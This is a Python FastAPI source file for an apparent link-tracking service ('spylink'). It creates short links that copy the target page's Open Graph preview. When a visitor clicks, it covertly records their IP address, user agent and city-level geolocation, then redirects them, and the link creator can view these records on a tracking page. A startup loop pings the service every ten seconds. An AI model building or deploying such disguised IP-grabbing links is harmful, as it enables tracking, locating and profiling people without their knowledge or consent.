# main.py

from fastapi import FastAPI, Request, Form, Header, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import sqlite3
import string
import random
import asyncio
from datetime import datetime

import httpx
from bs4 import BeautifulSoup

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

DB_PATH = "links.db"
SERVICE_URL = "https://spylink-x8w5.onrender.com/"  # ← replace with your deployed URL


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # links table now stores OG metadata too
    c.execute("""
    CREATE TABLE IF NOT EXISTS links (
      id INTEGER PRIMARY KEY,
      code TEXT UNIQUE,
      target TEXT,
      email TEXT,
      created_at TEXT,
      og_title TEXT,
      og_description TEXT,
      og_image TEXT
    )""")

    c.execute("""
    CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY,
      link_id INTEGER,
      ip TEXT,
      user_agent TEXT,
      country TEXT,
      region TEXT,
      city TEXT,
      timestamp TEXT
    )""")
    conn.commit()
    conn.close()

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})



@app.on_event("startup")
async def startup():
    init_db()


def generate_code(length: int = 6) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


@app.post("/create", response_class=HTMLResponse)
async def create_link(
    request: Request,
    target_url: str = Form(...),
    shortener: str = Form(...),
    email: str = Form(...),
    capture_ip: str = Form(None),
    capture_geo: str = Form(None)
):
    # 1) generate or accept custom code
    code = generate_code() if shortener == "random" else shortener

    # 2) scrape Open Graph metadata from the target
    og_title = og_description = og_image = ""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            resp = await client.get(target_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            def meta_prop(p): 
                tag = soup.find("meta", property=p)
                return tag["content"] if tag and tag.has_attr("content") else ""
            og_title       = meta_prop("og:title")
            og_description = meta_prop("og:description")
            og_image       = meta_prop("og:image")
    except Exception:
        # if scraping fails, just leave OG fields blank
        pass

    # 3) store link + OG in DB
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    created_at = datetime.utcnow().isoformat()
    try:
        c.execute("""
            INSERT INTO links
              (code, target, email, created_at, og_title, og_description, og_image)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (code, target_url, email, created_at,
              og_title, og_description, og_image))
    except sqlite3.IntegrityError:
        # collision: regenerate code once
        code = generate_code()
        c.execute("""
            INSERT INTO links
              (code, target, email, created_at, og_title, og_description, og_image)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (code, target_url, email, created_at,
              og_title, og_description, og_image))
    conn.commit()
    conn.close()

    link_url  = request.url_for("redirect_to_target", code=code)
    track_url = request.url_for("track",            code=code)

    return templates.TemplateResponse(
        "result.html",
        {"request": request, "link_url": link_url, "track_url": track_url}
    )


@app.get("/{code}", response_class=HTMLResponse)
async def redirect_to_target(
    request: Request,
    code: str,
    x_forwarded_for: str | None = Header(None)
):
    # 1) fetch link + OG from DB
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
      SELECT id, target, og_title, og_description, og_image
      FROM links WHERE code=?
    """, (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Link not found")

    link_id, target, og_title, og_description, og_image = row

    # 2) resolve real client IP
    if x_forwarded_for:
        ip = x_forwarded_for.split(",")[0].strip()
    else:
        ip = request.client.host or ""

    ua = request.headers.get("user-agent", "")

    # 3) geolocation lookup with fallback
    country = region = city = ""
    async with httpx.AsyncClient() as client:
        try:
            # primary: ipapi.co
            r = await client.get(f"https://ipapi.co/{ip}/json", timeout=5.0)
            data = r.json()
            if r.status_code == 200 and not data.get("error"):
                country = data.get("country_name", "") or ""
                region  = data.get("region", "") or ""
                city    = data.get("city", "") or ""
            else:
                # fallback: ip-api.com
                r2 = await client.get(
                    f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city",
                    timeout=5.0
                )
                d2 = r2.json()
                if d2.get("status") == "success":
                    country = d2.get("country", "") or ""
                    region  = d2.get("regionName", "") or ""
                    city    = d2.get("city", "") or ""
                else:
                    print(f"[GeoError] {ip} → {d2.get('message')}")
        except Exception as e:
            print(f"[GeoException] {e!r}")

    # 4) log the visit
    timestamp = datetime.utcnow().isoformat()
    c.execute("""
      INSERT INTO visits
        (link_id, ip, user_agent, country, region, city, timestamp)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (link_id, ip, ua, country, region, city, timestamp))
    conn.commit()
    conn.close()

    # 5) serve OG + instant redirect interstitial
    return templates.TemplateResponse("redirect.html", {
        "request": request,
        "target": target,
        "og_title": og_title,
        "og_description": og_description,
        "og_image": og_image
    })


@app.get("/track/{code}", response_class=HTMLResponse)
async def track(request: Request, code: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM links WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Link not found")
    link_id = row[0]

    c.execute("""
      SELECT ip, user_agent, country, region, city, timestamp
      FROM visits WHERE link_id=?
      ORDER BY timestamp DESC
    """, (link_id,))
    visits = c.fetchall()
    conn.close()

    return templates.TemplateResponse(
        "track.html",
        {"request": request, "code": code, "visits": visits}
    )


@app.get("/ping")
async def ping():
    return {"status": "alive"}


@app.on_event("startup")
async def schedule_ping_task():
    async def ping_loop():
        async with httpx.AsyncClient(timeout=5.0) as client:
            while True:
                try:
                    r = await client.get(f"{SERVICE_URL}/ping")
                    if r.status_code != 200:
                        print(f"[Ping] returned {r.status_code}")
                except Exception as e:
                    print(f"[PingError] {e!r}")
                await asyncio.sleep(10)
    asyncio.create_task(ping_loop())
